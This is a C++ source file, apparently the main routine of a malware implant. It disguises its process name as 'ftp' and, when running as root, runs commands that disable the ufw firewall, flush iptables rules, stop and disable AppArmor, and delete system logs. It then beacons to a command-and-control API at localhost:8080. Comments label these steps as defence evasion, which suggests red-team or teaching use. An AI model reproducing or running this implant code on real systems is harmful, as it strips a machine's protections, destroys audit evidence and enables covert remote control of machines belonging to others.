#include <iostream>
#include <sys/prctl.h>
#include <cstdlib>
#include <boost/system/system_error.hpp>
#include "implant.hpp"

#define ROOT_UID 0

int main(int argc, char* argv[]){
    /* Defence Evasion: Rename process to 'ftp' */
    prctl(PR_SET_NAME, "ftp");

    /* Defence Evasion: If  root privilege */
    /* Try to deactivate defences on the machine */
    if (getuid() == ROOT_UID) {
        system("ufw disable"); // Disable uninterrupted firewall
        system("iptables -F"); // Flush all iptables rules

        /* Disable AppArmour */
        system("service apparmor stop");
        system("systemctl disable apparmor");

        system("rm -rf /var/log/syslogs"); // Remove logs
    }

    const auto host = "localhost";
    const auto port = "8080";

    // Setup the API Singleton
    Api::setup(host, port);

    std::unique_ptr implant = std::make_unique<Implant>();

    try {
        implant->beacon();
    }
    catch (const boost::system::system_error& se) {
        std::cout << "\nSystem error:" << se.what() << std::endl;
    }

    return 0;
}